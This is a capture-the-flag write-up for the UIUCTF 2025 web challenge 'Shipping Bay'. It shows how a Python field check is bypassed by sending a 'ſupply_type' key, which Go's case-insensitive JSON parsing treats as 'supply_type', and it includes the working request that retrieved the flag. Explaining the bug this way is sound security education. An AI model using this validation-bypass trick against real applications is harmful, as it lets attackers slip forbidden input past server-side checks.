---
title: "UIUCTF 2025 - Shipping Bay"
date: 2025-07-29 14:00:00 +0200
categories: [UIUCTF 2025, Web]
tags: [Web]
description: Writeup for the challenge "Shipping Bay" from the UIUCTF of 2025
---

## The write up

Here's my write up for "Shipping Bay". Hope you like it !

This challenge gives us the source code of the application, so let's read it.

### Reading the source code

First, we need to locate the flag.

``` go
type Shipment struct {
	ID          string `json:"id"`
	Destination string `json:"destination"`
	Origin      string `json:"origin"`
	SupplyType  string `json:"supply_type"`
	Weight      string `json:"weight"`
	Status      string `json:"status"`
	Departure   string `json:"departure"`
	Arrival     string `json:"arrival"`
	Priority    string `json:"priority"`
	Vessel      string `json:"vessel"`
}


func sendShipment(shipment Shipment) string {
	if shipment.SupplyType == "flag" {
		if flag, exists := os.LookupEnv("FLAG"); exists {
			return flag
		}
		return "uiuctf{fake_flag}"
	}
	return "oops we lost the package"
}
```
{: file="processing_service/main.go"}

Our goal is to somehow call the function ```sendShipment``` with as argument a Shipment structure that as a ```SupplyType``` equal to ```flag```.

Right after in the file, we have the main function : 

``` go
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: processing_service '<json_string>'")
		os.Exit(1)
	}
	jsonStr := os.Args[1]
	var shipment Shipment
	err := json.Unmarshal([]byte(jsonStr), &shipment)
	if err != nil {
		fmt.Println("Error parsing JSON:", err)
		os.Exit(1)
	}

	fmt.Println(sendShipment(shipment))
}

```
{: file="processing_service/main.go"}

After a quick view, we see that we need to provide one argument to the program (remember that the filename itself counts as one argument). This argument has to be a json string. The json string will then be converted into a ```shipment``` which represents the struct above. Then, we print the result of the call of ```sendShipment``` function (where the flag is located !). So, we want to run the file ```processing_service``` with a json string that represents a shipment structure where the ```SupplyType``` is set to ```flag```.

Note that ```processing_service``` is built at the start of the instance (see the Dockerfile).

For this, we need to interact with the web application.
We have 3 differents routes in ```index.py``` : 

``` python
@app.route('/')
def index():
    return render_template('index.html', shipments=SAMPLE_SHIPMENTS)

@app.route('/new_shipment')
def new_shipment():
    return render_template('new_shipment.html')

@app.route('/create_shipment', methods=['POST'])
def create_shipment():
    shipment_data = {k.lower(): v for k, v in request.form.items()}

    if shipment_data['supply_type'] == "flag":
        return "Error: Invalid supply type", 400

    shipment_status = subprocess.check_output(["/home/user/processing_service", json.dumps(shipment_data)]).decode().strip()

    return redirect(url_for('index', status=shipment_status))
```
{: file="index.py"}

We see that the routes ```/``` and ```/new_shipment``` are just rendering some template and are not really interesting since they do not interact with the ```processing_service``` file.

However, ```/create_shipment``` does interact with that file. This route verify this condition ```shipment_data['supply_type'] == "flag":``` and if this is false, it passes all the data from our request (as a json string) to the ```processing_service``` file.

### The problem

So to get the flag, we have to meet two conditions :

- supply_type must be equal to "flag"
- supply_type must be different from "flag"

Obviously, this is not possible, we need to get a way around this.

The key is that the checks are not in the same language : the first is made by python while the second is by go.
We need to find an inconsistency between python and go parsers.

At first I tried to send two ```supply_type``` like this : ```{'supply_type': 'a', 'supply_type': 'b'}``` but when encontering 2 indentical keys, both python and go parsers take the last one, so no inconsistency.

Then I remembered of unicode normalization. In Unicode, some characters are visually similar but have different codepoints. Some languages normalize these before processing, which can cause inconsistencies. You have maybe seen some weird letter like ```ſ```, this is a unicode character but when you do some manipulation with it, you get some strange things to happen like this : 

``` python
>>> 'ſ'.upper()
'S'
```

The 'strange' `s` becomes a 'normal' `s` !

Maybe we can have some inconsistency with that.

Note that ```'ſ'.lower()``` produce ```'ſ'```, so no normalization in the web application python's code.

### Will this work ?

Let's hope that the go parser actually normalize our weird `s` with a regular `s`. We already know that python does not via ```.lower()```

Here's the plan :

We need to submit a ```ſupply_type``` (notice the weird ```s``` instead of the regular) with ```"flag"``` as the value. It will not be considered by python (because ```'ſupply_type'.lower()``` produce ```'ſupply_type'``` which is different from ```'supply_type'```) and (hopefully) be normalized by go which should give us the flag.

So let's test that ! 

``` python
>>> print(requests.post('https://shipping-bay.chal.uiuc.tf/create_shipment', {'ſupply_type': 'flag'}))
<Response [500]>
```

We do not get the flag but a 500 error, is there something broken with the weird ```s``` ?

``` python
>>> print(requests.post('https://shipping-bay.chal.uiuc.tf/create_shipment', {'upply_type': 'flag'}))
<Response [500]>
```

Ok probably not, let's just review the code quickly : 

``` python
shipment_data['supply_type']
```
{: file="index.py"}

When trying to fetch ```supply_type``` from the request python raises an error because it's not in ! We will just add a proper ```supply_type``` with a random value before the 'weird' one (remember, go is seeing 2 same keys and only taking the last one !).

``` python
>>> urldecode(requests.post('https://shipping-bay.chal.uiuc.tf/create_shipment', {'supply_type': '', 'ſupply_type': 'flag'}).url)
'https://shipping-bay.chal.uiuc.tf/?status=uiuctf{maybe_we_should_check_schemas_8e229f}'
```

And BOOM, we got our flag !